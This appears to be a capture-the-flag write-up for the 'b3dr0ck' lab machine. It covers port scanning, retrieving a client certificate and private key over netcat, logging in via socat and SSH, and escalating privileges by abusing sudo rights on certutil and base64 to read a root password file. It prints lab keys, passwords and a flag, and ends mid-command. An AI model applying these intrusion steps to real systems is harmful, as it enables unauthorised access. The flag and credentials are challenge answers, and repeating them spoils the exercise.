# CTF Writeup: b3dr0ck

---

## Reconaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sS -p- 10.114.181.149          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-01 15:47 CDT
Nmap scan report for 10.114.181.149
Host is up (0.014s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4040/tcp  open  yo-main
9009/tcp  open  pichat
54321/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.49 seconds
```

An more detailled scan revealed further information abt running services on the target server.

```
nmap -n -Pn -sSCV -p 22,80,4040,9009,54321 10.114.181.149
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-01 15:52 CDT
Nmap scan report for 10.114.181.149
Host is up (0.013s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:32:68:b3:2c:8c:c2:52:95:f5:4e:2b:0e:13:33:f4 (RSA)
|   256 cd:63:70:43:a7:2b:e0:9f:18:cf:b1:73:ef:b9:bb:7a (ECDSA)
|_  256 83:2b:ca:64:ee:c8:79:b2:3f:2a:34:0e:78:f0:ca:12 (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.114.181.149:4040/
|_http-server-header: nginx/1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2026-05-01T20:46:13
|_Not valid after:  2027-05-01T20:46:13
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Fri, 01 May 2026 20:52:28 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
| tls-alpn: 
|_  http/1.1
9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2026-05-01T20:46:13
|_Not valid after:  2027-05-01T20:46:13
| fingerprint-strings: 
|   Kerberos: 
|_    Error: 'undefined' is not authorized for access.
|_ssl-date: TLS randomness does not represent time
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.95%T=SSL%I=7%D=5/1%Time=69F5128C%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html
SF:\r\nDate:\x20Fri,\x2001\x20May\x202026\x2020:52:28\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20\
SF:x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x2
SF:0\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2035em;\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;\
SF:n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20\x20</head>\n
SF:\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC!</h1>\n\x20\
SF:x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\n\x20\x20\x20
SF:\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20a\x20website!
SF:\x20Can\x20you\x20believe\x20this\x20technology\x20exists\x20in\x20bedr
SF:ock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping\x20to\x20set
SF:up\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\x20was\x20imp
SF:ortant\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x20only\x20fig
SF:ured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\x20is\x20a\x2
SF:0database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\x20sql\x20dat
SF:abase,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLooks\x20like\x2
SF:0it\x20started\x20something\x20else,\x20but\x20I'm\x20not\x20sure\x20ho
SF:w\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20was\x20from\x
SF:20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20try\x20and\x20
SF:secure\x20")%r(HTTPOptions,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:
SF:\x20text/html\r\nDate:\x20Fri,\x2001\x20May\x202026\x2020:52:28\x20GMT\
SF:r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<hea
SF:d>\n\x20\x20\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x
SF:20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x20
SF:35em;\n\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x2
SF:0sans-serif;\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20
SF:\x20</head>\n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC
SF:!</h1>\n\x20\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\
SF:n\x20\x20\x20\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20
SF:a\x20website!\x20Can\x20you\x20believe\x20this\x20technology\x20exists\
SF:x20in\x20bedrock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping
SF:\x20to\x20setup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\
SF:x20was\x20important\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x
SF:20only\x20figured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\
SF:x20is\x20a\x20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\
SF:x20sql\x20database,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLoo
SF:ks\x20like\x20it\x20started\x20something\x20else,\x20but\x20I'm\x20not\
SF:x20sure\x20how\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20
SF:was\x20from\x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20t
SF:ry\x20and\x20secure\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9009-TCP:V=7.95%I=7%D=5/1%Time=69F5127C%P=x86_64-pc-linux-gnu%r(NUL
SF:L,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\n
SF:\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x2
SF:0\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x20
SF:___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x20
SF:\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x20
SF:\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\x
SF:20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20/
SF:\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20
SF:\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\|
SF:\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|\
SF:x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x20
SF:\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\___
SF:\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n
SF:\nWhat\x20are\x20you\x20looking\x20for\?\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port54321-TCP:V=7.95%T=SSL%I=7%D=5/1%Time=69F51282%P=x86_64-pc-linux-gn
SF:u%r(Kerberos,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20fo
SF:r\x20access\.\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.25 seconds
```

When inspecting the website running on port 80, we are getting redirected to an webpage. Which displays the following content.

```
Welcome to ABC!

Abbadabba Broadcasting Compandy

We're in the process of building a website! Can you believe this technology exists in bedrock?!?

Barney is helping to setup the server, and he said this info was important...

Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...


```

Upon inspecting the service running on port 9009 in the browser, we receive the following information displayed in the browser.

```
HTTP/0.9 1337 No response headers received



 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
What are you looking for? 
```

## Initial Access

We got the information that we can connect to the database/server running on port 54321 with socat. But first we need to utilize the mentioned TCP socket to receive the TLS credential files (client key & certificate).

I tried to connect with "nc" on multiple ports and identified that the service on port 9009 seems to be our target.

```
nc 10.114.181.149 9009


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for?
```

Received the Certificate

```
What are you looking for? Certificate
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNjA1MDEyMDQ2MTRaFw0yNzA1MDEyMDQ2MTRaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDMIvCL
oTm6vhLhTm3wnZwOJKEQZlsuAH/wLTpc2TJFhsUT2VO9PZTZkt/YumFTY0ZTcFA2
T4Jxu85HYny2rjTMQOvnUSV4s8R7y/36JNbc52wt2lDQQkonaqZzg9rphIgQ/AEO
KmTHfjmlD+NuxC4PJsKmpqPvZ+TOWjbK9R2vzdJQ+Ly7qBZxtf15+OB6LrgMxOD5
TmzzhLlYQzpKX7AvQrkfBwa8ws49flfl4imVkIDzKwwWKWXq8fj7Zl7N1BAJ6zmm
OMtkjCaTb/bNl/WIDlqu7ge+AGoOga+9IgjfXXl7JeVF19Gfilv+vi5trnlzPIc9
jAOqAQIa+z8kjTrVAgMBAAEwDQYJKoZIhvcNAQELBQADggEBADnAyRyJELH+wj6o
ZxuAvFiSjbroDiuBidZoRDWebZML73BX48ttrFN8qkd3f+GUGjN159F6NGGor5aH
2VzNRtZb5Z6S6+gI723PecHrUKPPd94S+fGzlgne960iPMejaJXDxsR2G3h+OUm0
k29X4L3D32Vqu6Pj/OZQ6Yl7dXRB9iU2CmKygqYqDjvK8XcWMlrzHGzp3vBgEps/
hbc3snEn5vkcNQcQv8PnmpZ+qyIBqQMFMw0t6KIhUDA4og+7d8Xu87b+LFZx9loS
9dEeWwxNYavnLqKVI+YcimpoBk/xqTUntvL6Bsx5GSNiNXGRX9Mndp2kgLloPZZw
f/ovXbY=
-----END CERTIFICATE-----
```

Received the Client Key

```
What are you looking for? Key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAzCLwi6E5ur4S4U5t8J2cDiShEGZbLgB/8C06XNkyRYbFE9lT
vT2U2ZLf2LphU2NGU3BQNk+CcbvOR2J8tq40zEDr51EleLPEe8v9+iTW3OdsLdpQ
0EJKJ2qmc4Pa6YSIEPwBDipkx345pQ/jbsQuDybCpqaj72fkzlo2yvUdr83SUPi8
u6gWcbX9efjgei64DMTg+U5s84S5WEM6Sl+wL0K5HwcGvMLOPX5X5eIplZCA8ysM
Fill6vH4+2ZezdQQCes5pjjLZIwmk2/2zZf1iA5aru4HvgBqDoGvvSII3115eyXl
RdfRn4pb/r4uba55czyHPYwDqgECGvs/JI061QIDAQABAoIBADWRnaomnu2gX3f8
iuEvmvojJpkVIyxJOUmftMcUwBp6qVDyIQVyGZOW9WL8Vfn5/UR8HrCB4OtTq2gU
MkIGKRjImJ9VLg4krpUGDRoNfMzvdfX6amacXrVFSXTazyGkg8hhOS2sdlHbj+j+
6GHy3VtggogVBsQWcXatOd+8vxOY6M0TyHl7HDHlfwCTYLA1xEcRAEX90Q8mDGX3
HIgL01Aj2zgq9QWxDKYrgucJAa7ZpvyuJdQLN5jWW5zJ7RzPs9jyhFJlRQcaXHli
iZ16poh5EMzNKd1CTLc2waiX8z/WKkXLr0QSpb1fKZ9z+/b3aMPWbv0ol7njtToN
TS7JE0ECgYEA/aYqyUYY1MZeQC4hdxNHZjLVs4mlt8bqyQaZQ2yBWba2x64QiVqs
utKv/dHEc2gMBHVj4ZIHGSYnnR3gRBfGyNMJmtDNMWprh8tYACWJt6UvPxcOmA/A
7T39RKBe9IyVu0tf5l3/4PJJ4bX/vqFpIRqAuR856pwoOvz2W06cJG0CgYEAzgdL
Q29QWv1G4C/KpqWYJtHoKVAhWoHogsqpARczs1OsQQxdRV/aM5TXFqtLR7rZku8C
dk9dSAjJsntJZybfF/zxFRmSbmqrqBqLQFbWLtXO3RspvAlncMO5P6+v8GSfKd5Z
wz+UZIt6bUPeCEU1qOr679rdtdILo8DEzfuJ3wkCgYAwYQVAJpKN4tgPPb08TP0N
TRzdhZ+KEfKuLQgGiCeTyPnL1DNrP1Q6vfy7WMszh+Di6NEIMSYRcemUWiJwWmib
3USztqesiTPBTtOWE5LU6Di+u9MYxchyd6Ra9oul8TqN4q6D7eHkMdJNrrz8yySW
H8v1gzM0wFwcBCuo9rFpcQKBgBMEJ1U9E/yh/gW5Q4ooJKgIndYaWEnDTdOsova/
znzRz0ddvcomc7xpE4U7IEKpo2VlfCOxZZm9fehkar0DoHnVVectqg9Y9ykX8hxp
J3HBOEu+MxbxA0QsPI/9Rk746pvxsvVLjAXPvegR6I942+AQeELlP6uFjJ97rm6Y
tfwJAoGAU7O4GzVD6G8vTESIhx+QlzVIGG/wdS2I8sjZw6D8KMVgr5FQeFwp1Nk3
ALjqZSXUFXn4KHydVbqvLNeJ11HWLw01tM21QR8NNYKAyVpmnXQobzDNieOPIeIP
hwJagZvswo+4B/SdtIQhaUWhEyzcMfJRNlpkjZoqixRgY4Kj/KE=
-----END RSA PRIVATE KEY-----
```

Saved both locally, now we can utilize socat to connect to the database/server running on port 54321.

```
socat stdio ssl:10.114.181.149:54321,cert=certificate,key=rsa_key,verify=0
2026/05/01 16:20:14 socat[39188] W refusing to set empty SNI host name


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck>
```

Successfully connected as user "barney".

Upon using "help" I received the plaintext password of user "barney".

```
b3dr0ck> help
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
```

Connected to the server via SSH.

```
ssh barney@10.114.181.149                                                     
The authenticity of host '10.114.181.149 (10.114.181.149)' can't be established.
ED25519 key fingerprint is: SHA256:FjTkQ81MuMNIWdXiwt0tfa2ZBNDNpdBJgoc6mijApa0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.114.181.149' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
barney@10.114.181.149's password: 
barney@ip-10-114-181-149:~$
```

Retrieved barney.txt flag in /home/barney

```
THM{f05780f08f0eb1de65023069d0e4c90c}
```

Enumerated running users on the target server.

```
barney@ip-10-114-181-149:/$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
fred:x:1000:1000:Fred Flintstone:/home/fred:/bin/bash
barney:x:1001:1001:Barney Rubble,,,:/home/barney:/bin/bash
ubuntu:x:1003:1005:Ubuntu:/home/ubuntu:/bin/bash
```

## Privilege Escalation

Upon inspecting barney's sudo permissions, we can see that he is able to execute the certutil binary with root permissions.

```
barney@ip-10-114-181-149:/var$ sudo -l
[sudo] password for barney: 
Matching Defaults entries for barney on ip-10-114-181-149:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on ip-10-114-181-149:
    (ALL : ALL) /usr/bin/certutil
```

Further information about the certutil binary.

```
barney@ip-10-114-181-149:/var$ /usr/bin/certutil -h

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]
```

We can see that fred's key is also in here.

```
barney@ip-10-114-181-149:/var$ sudo certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30  2022 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r----- 1 root root  972 May  1 20:46 barney.certificate.pem
-rw-r----- 1 root root 1674 May  1 20:46 barney.clientKey.pem
-rw-r----- 1 root root  894 May  1 20:46 barney.csr.pem
-rw-r----- 1 root root 1678 May  1 20:46 barney.serviceKey.pem
-rw-r----- 1 root root  976 May  1 20:46 fred.certificate.pem
-rw-r----- 1 root root 1678 May  1 20:46 fred.clientKey.pem
-rw-r----- 1 root root  898 May  1 20:46 fred.csr.pem
-rw-r----- 1 root root 1678 May  1 20:46 fred.serviceKey.pem
```

Ran the following command with sudo permissions and it generated an client key & certificate for user "fred". Let's utilize them to authenticate against the service on port 54321.

```
barney@ip-10-114-181-149:/var$ sudo certutil fred fred.clientKey.pem
Generating credentials for user: fred (fredclientKeypem)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA4yas7NZuYx8+gAqkx9nY+g117IU0idroIyPWUOEUjvT1LzR9
KRJzQHhBu8GhpB8vgo1GzVrjleRxyl7uywcH4ymdsXKMEGEVso7B8ADOcnlDLZWZ
8B5BXElO4kgsntv937nSU/xctR4ZHgmJlz+sKEAvQn856OjILyF2Mk43TLPuNdwh
oYf23e4IaCG/mlilukHD+De8m6aC3PS0P8yfxng7q2NqHCkUR/SfxScM4exB3xE9
NQxQFHbL2hTNqo7a9lupRiVyjTwx+YNQZoLTam093hQ2wPXlkLn39pKMjua8eskF
PhXS5PB+A1G94HyZayymo/8HvvOP1IqYZmK0IwIDAQABAoIBAQC9RImL4fQilXMP
X08D0unvGG4swKURRJxuQzsdMx5dK5BsX9D1+xCbJFipKGMWDIIaxrq6+0Nsrud9
lvJjqx0QU6m4pFg+gZaBrF++Kf3a9l1aSy/0GlGdotuewkKjr2xvETdGkZ1xsH1/
QLUrmHtLIof+YWIQRn4ef0QsEG4Vcrjw4iI/69LqY6WTLj9XQ1nIsW5HHJxL083Y
yl6FdV8ofUGAEa/bQtG96kCxXxtIiEeIPHQUjFcL71UwObNhGMRrET1BGeqsoFfO
WJwdY2xxUlGQ0k/O8Jw/Bv8InYi/F34ztUAjMqwuVbEuNdkPOtlgvoricl6GyqE7
jjtsTjNhAoGBAP0ky/2OfOo5vkcOe6xsTzYHz+z17CxUxRnFfqVX0fsn+x0EWIj+
YA7QKK1mL4qIfxHt25uQfNRb8o6eWkFG925OxdyPirDJHAzyHP/32/0i+2DFbifd
6VeY7uWiJFVL1BMPpAzP0zXga7LdHL9dULgZlBl4QMP4JH3n5HaQC0fRAoGBAOW2
zJJPDL4WZhI0p/1pLY/pv5/AzcDaMnawWfAY3wXb8T9QBavZ3ctH/O8YhUIr9Fyt
hNbQiXwHZVNeHbPOmtNWbpn2sHRHktODwLT2cDjcRvf1Rye2ryKSPV2mVSp78UNG
RVUtRoMUI89AciOalEjjjvrunVhubdvPOE0Ak+2zAoGBAN89SxPxS2G3yICbWh9l
aLlqTEhZW4yAuU0P6K7hcpE94ermATnWsll94tGAEx7lXsIt9AQNeLhB2fdB2LBG
aEAEAeOPRqy+vhkAjuiA6aUj63Gcypcn0PbqLIuf4NDDzWN94JtXz5hssC2NZyOv
pFamX//SF7N6qpvKG6UfRINxAoGBAIKqs7056BasqQ0MFM7KKFencBAQXTmpJHFt
KQuxKhOsI5OPElrJyCcc4NykhxC37f1V2q1S3BHIJzP/4kdoa5txm+JKd97846Eb
Xd/SGs3NRzU+uWX2vbKdmviNZ/6NmBRbgY7M/UIMj74Re5uTD2xSvP8yAiDOWAFj
4zOx83OPAoGAeiFgAREJiVAa8I8w4HKzi1rTXe8UWxfbdsBECkl5qECom5Gk42VQ
3PvdOWk52xwtZGPvZVWVwyzAaN+dBLM6pL3lmTEeBSPyYIp8qvCeSy4/8FV2a6Iv
GdO1WlhCKEiyKV47CjpbIho50zaA7Hir1P7EMG+Cm3d5GsA25WK9kH0=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICpDCCAYwCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNjA1MDEyMTI5MjZaFw0yNjA1MDIyMTI5MjZaMBsxGTAXBgNVBAMMEGZy
ZWRjbGllbnRLZXlwZW0wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDj
Jqzs1m5jHz6ACqTH2dj6DXXshTSJ2ugjI9ZQ4RSO9PUvNH0pEnNAeEG7waGkHy+C
jUbNWuOV5HHKXu7LBwfjKZ2xcowQYRWyjsHwAM5yeUMtlZnwHkFcSU7iSCye2/3f
udJT/Fy1HhkeCYmXP6woQC9Cfzno6MgvIXYyTjdMs+413CGhh/bd7ghoIb+aWKW6
QcP4N7ybpoLc9LQ/zJ/GeDurY2ocKRRH9J/FJwzh7EHfET01DFAUdsvaFM2qjtr2
W6lGJXKNPDH5g1BmgtNqbT3eFDbA9eWQuff2koyO5rx6yQU+FdLk8H4DUb3gfJlr
LKaj/we+84/UiphmYrQjAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAHjlYOQdfqdx
F76B+mVKbB4hF34O6TdyNlok4c+bIORKatyOzP5n30qt5ZiFRH4dcSidoNZZkkDO
rMeM0IxG9HvfIASx4zDfelJlaNgJybZTdAaUYT0PJUDCqhrYXUGviUh7r7/Yreq9
JUt6dAioAHTL96Ss1sv1Df05x7QrlbU3qyYVgvp6casqWeucY0kedY8JmEiqiOB1
QFFZPuGbeTVq+aDlchcVItrSZGg1juG06tNOmQMx6+tqYXCoDqEwtiAg0cDzUk9E
grXjTnFgouQLfdtq7U8Imztxas00kztAM7il7uGNg1+EP9/+74NNoy8PH9gJurFm
MJFp3L5YkIg=
-----END CERTIFICATE-----
```

Connected to the server again using socat and executed help, in order to get user fred's plaintext password.

```
socat stdio ssl:10.114.181.149:54321,cert=certificate_fred,key=rsa_key2,verify=0
2026/05/01 16:31:13 socat[44899] W refusing to set empty SNI host name


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'fredclientKeypem' is authorized.
b3dr0ck> help
Password hint: YabbaDabbaD0000! (user = 'fredclientKeypem')
b3dr0ck>
```

Logged into user "fred".

```
su fred
YabbaDabbaD0000!
```

Checked user fred's sudo permissions and he seems to be able to run the base32 & base64 binary within the /root directory on an file called "pass.txt" which probably seems to be the password stored in an .txt file of the root user. Let's execute it!

```
fred@ip-10-114-181-149:~$ sudo base64 /root/pass.txt
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==
```

Since this is the base64 encoded password I will decode it on my local machine.

```
echo "TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
